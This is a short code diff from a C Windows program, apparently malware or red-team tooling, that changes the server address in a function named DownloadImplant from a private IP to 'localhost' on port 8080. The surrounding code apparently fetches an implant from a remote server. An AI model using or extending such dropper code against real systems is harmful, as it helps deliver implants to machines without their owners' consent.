@@ -62,7 +62,7 @@ void DownloadImplant() {
         exit(1);
     }
 
-    InetPtonA(AF_INET, "192.168.110.129", &cleanServer.sin_addr.s_addr);
+    InetPtonA(AF_INET, "localhost", &cleanServer.sin_addr.s_addr);
     cleanServer.sin_family = AF_INET; 
     cleanServer.sin_port = htons(8080);
 
